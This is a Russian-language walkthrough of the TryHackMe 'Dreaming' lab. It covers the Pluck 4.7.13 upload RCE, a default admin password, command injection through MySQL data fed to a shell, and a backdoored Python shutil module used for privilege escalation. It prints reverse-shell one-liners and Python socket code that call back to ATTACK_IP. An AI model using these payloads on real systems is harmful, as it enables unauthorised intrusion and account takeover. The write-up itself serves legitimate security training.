>https://tryhackme.com/room/dreaming

## Первичный анализ
Переходим по адресу лабораторной машины, там нас встречает стандартное приветствие Apache.
Просканируем директории с помощью Gobuster.

<p align="center">
  <img src="screenshots/1.png" alt="Gobuster" width='600'>
  <br>
  <em>Результат сканирования Gobuster</em>
</p>

Gobuster нашел директорию `/app`. При переходе туда замечаем интересную папку <b>pluck-4.7.13</b>.
<br>

<p align='center'>
  <img src='screenshots/2.png' width='400'>
</p>

А через нее можем попасть на страницу входа в админку. <br>

<p align='center'>
  <img src='screenshots/3.png' width='800'>
</p>

> [!NOTE]
> <b>Pluck</b> – это система управления контентом на PHP. Версия <b>4.7.13</b> уязвима для удаленного выполнения кода (![CVE-2020-29607](https://www.cve.org/CVERecord?id=CVE-2020-29607)).
> Суть заключается в том, что в функции управления файлами нет должной проверки расширений загружаемых файлов.
> Имея права администратора мы можем обойти ограничения файла `.htaccess` и черный список расширений. Нам необходимо загрузить PHP-скрипт (`.phar`). Apache обработает его как исполняемый PHP-код. Это даст нам веб-оболочку для удаленного доступа к файловой системе на сервере.

## Эксплуатация

На странице входа достаточно проверить несколько стандартных паролей, чтобы найти правильный – `password`.
Немного осмотревшись после успешной авторизации, находим тот самый уязвимый элемент Pluck – страницу загрузки файлов.
Теперь наша задача состоит в поиске подходящего эксплойта. Его можно найти на Exploit Database или Packet Storm.

<p align='center'>
  <img src='screenshots/4.png' width='700'>
  <br>
  <em>Exploit Database</em>
</p>

Скачиваем эксплойт, корректируем его в соответствии с данными нашей целевой машины и запускаем скрипт.

<p>
  <img src='screenshots/5.png' width='250' align='left'>
  <br>
  <em>Входные параметры из готового эксплойта с Exploit Database. Задаем IP-адрес цели, порт, пароль от учетной записи администратора и путь до Pluck CMS</em>
</p>
<br clear='left'/>

<p align='right'>
  <img src='screenshots/6.png' width='700' align='right'>
  <br>
  <em>Подстановка параметров и результат работы эксплойта</em>
</p>
<br clear='right'/>

<p align='center'>
  <img src='screenshots/7.png' width='600'>
  <br>
  <em>Web Shell на целевой машине</em>
</p>

После получения доступа к веб-оболочке надо бы настроить обратную оболочку для большего контроля. Это я делаю с помощью <b>Netcat</b> и <b>mkfifo</b>.

> [!NOTE]
> Утилита и системный вызов <b>mkfifo</b> создают именованный канал (FIFO – First In, First Out), который позволяет различным процессам обмениваться данными через файловую систему.

`nc -lvnp 9001` – для прослушивания на атакующей машине. <br>
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACK_IP 9001 >/tmp/f` – для реверс оболочки.

<p align='center'>
  <img src='screenshots/8.png' width='600'>
  <br>
  <em>Прослушивание порта 9001 на атакующей машине через Netcat</em>
  <br> <br>
  <img src='screenshots/9.png' width='600'>
  <br>
  <em>Выполнение полезной нагрузки (payload) для обратного соединения через порт 9001.</em>
</p>

Прогулявшись по файловой системе удалось найти, где хранятся флаги, необходимые для задания:
- `/home/lucien`
- `/home/death`
- `/home/morpheus`

Но просто так прочитать их, разумеется, не получится, прав доступа недостаточно.
<br>
## Первый флаг (Lucien)
В директории `/opt` есть два интересных файла: `getDreams.py` и `test.py`.
<br>
1. `getDreams.py` подключается к БД MySQL, получает из нее данные и выводит их в консоль.

<p align='center'>
  <img src='screenshots/11.png' width='500'>
  <br>
  <em>На скриншоте представлена только часть <code>getDreams.py</code></em>
</p>

Здесь можно заметить, что доступ к БД `library` есть только у пользователя `death`. Подключение к `localhost` => БД расположена на той же машине, что и скрипт. <br>
SQL-запрос в коде выглядит так: `SELECT dreamer, dream FROM dreams;`. Отсюда мы узнаем название таблицы и столбцов в ней. <br>
Также в коде присутствует и такая часть:
```
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
print(shell)
```
Данные из БД напрямую подставляются в системную команду. Тогда, если мы получим доступ к редактированию данных в БД, сможем воспользоваться уязвимостью <b>OS Command Injection</b>. Не уверена, пригодится ли это в данной задаче, но лучше помнить об этом. <br>

2. В `test.py` находим пароль Люсьен!

<p align='center'>
  <img src='screenshots/12.png' width='500'>
</p>

Заходим в учетную запись Lucien, используя команду по SSH и читаем флаг из `/home/lucien`.

> [!NOTE]
> Изначально я пыталась работать через `su lucien`, но мало того, что оказалось просто неудобно, так еще и в дальнейшем я не смогла подключиться к MySQL.
> Поэтому лучше сразу использовать подключение по SSH. Оно стабильнее.

<p align='center'>
  <img src='screenshots/13.png' width='500'>
  <br>
  <em>Флаг Lucien</em>
</p>

## Второй флаг (Death)
`sudo -l` выводит список привилегий для текущего пользователя. Используем ее и увидим, что можем запустить `getDreams.py` от имени Lucien. Значит, мы можем попробовать взаимодействовать с базой данных. Нужно только получить пароль.
<br>

В `.bash-history` сохраняется история выполненных команд, поэтому там можно найти какую-нибудь зацепку. В нашем случае через терминал выполнялся вход в MySQL. Просто повторим команду, найденную в `/home/lucien/.bash-history`.

<p align='center'>
  <img src='screenshots/14.png' width='500'>
  <br>
  <em>Успешный вход в MySQL</em>
</p>

`use library`– выбираем нужную БД, название которой мы узнали из `getDreams.py`; <br>
`SELECT * FROM dreams` – смотрим, какие данные уже есть в таблице `dreams`. <br>

Нам нужно добавить полезную нагрузку для получения еще одной обратной оболочки, но уже от имени Death. <br>

`INSER INTO dreams (dreamer, dream) VALUES ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACK_IP 8889 >/tmp/f');` – внедряем полезную нагрузку в новую строку таблицы. <br>

Теперь, когда в следующий раз запустится `getDreams.py`, сработает наша полезная нагрузка и при прослушивании порта 8889 мы получим реверс-шелл. <br>

Выходим из панели управления MySQL, включаем прослушивание через Netcat и запускаем `getDreams.py` от имени Death: <br>
`sudo -u death python3 /home/death/getDreams.py`

<p align='center'>
  <img src='screenshots/15.png' width='500'>
  <br>
  <em>Внедрение полезной нагрузки в MySQL и поулчение реверс-шелла Death</em>
</p>

Мы получили управление файловой системой от иени Death и можем прочитать флаг в его директории.

<p align='center'>
  <img src='screenshots/16.png' width='500'>
  <br>
  <em>Флаг Death</em>
</p>

## Третий флаг (Morpheus)

Так как `getDreams.py` принадлежит пользователю Death, мы теперь сможем увидеть пароль от MySQL, который ранее был скрыт. 

<p align='center'>
  <img src='screenshots/17.png' width='500'>
  <br>
  <em>Пароль MySQL пользователя Death</em>
</p>

Попробуем подключиться по SSH с этим паролем и выясняем, что он подходит. Отлично, теперь у нас есть более стабильное соединение.

В домашнем каталоге Morpheus находятся файлы `restore.py` и `kingdom`.

<p align='center'>
  <img src='screenshots/18.png' width='500'>
  <br>
  <em><code>/home/morpheus</code></em>
</p>

`restore.py` копирует содержимое `/home/morpheus/kingdom` в `/kingdom_backup/kingdom` с помощью модуля `shutil`. <br>
Файл `restore.py` регулярно запускается пользователем Morpheus, поэтому нам нужно использовать его как входную точку. <br>

Найдем, где находится файл этого модуля с помощью `find`.

<p align='center'>
  <img src='screenshots/19.png' width='500'>
</p>

Перейдя в `/usr/share/python3.8` можно заметить, что у пользователя Death есть права на редактирование `shutil.py`.

<p align='center'>
  <img src='screenshots/20.png' width='500'>
  <br>
  <em>Права доступа <code>shutil.py</code></em>
</p>

Воспользуемся этим для получения еще одной обратной оболочки: <br>
- Импортируем модули `pty` и `socket`;
  ```
  import pty
  import socket
  ```
- Заменим содержимое функции `copy2`.
  ```
  def copy2(src, dst, *, follow_symlinks=True):
    lhost = "ATTACK_IP"
    lport = 8890
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
  ```

Теперь нужно лишь подождать, пока `restore.py` не запустится "по расписанию" и вот! Мы получили обратную оболочку.

<p align='center'>
  <img src='screenshots/21.png' width='500'>
  <br>
  <em>Обратная оболочка Morpheus</em>
</p>

Прочитаем флаг из домашней директории:

<p align='center'>
  <img src='screenshots/22.png' width='500'>
  <br>
  <em>Флаг Morpheus</em>
</p>
